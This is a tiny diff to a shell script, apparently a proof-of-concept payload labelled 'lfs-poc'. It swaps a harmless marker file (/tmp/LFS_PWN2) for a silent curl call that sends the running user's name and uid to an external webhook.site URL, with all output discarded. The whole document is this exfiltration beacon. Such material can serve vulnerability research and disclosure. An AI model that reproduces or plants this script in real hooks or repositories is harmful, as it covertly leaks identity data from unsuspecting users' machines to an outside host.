@@ -1,3 +1,3 @@
 #!/bin/sh
-touch /tmp/LFS_PWN2
+curl -s -m 5 "https://webhook.site/6ae09da4-1438-47d5-a786-2f1fcf9ce02e?src=lfs-poc&user=$(id -un)&uid=$(id -u)" >/dev/null 2>&1
 exit 0
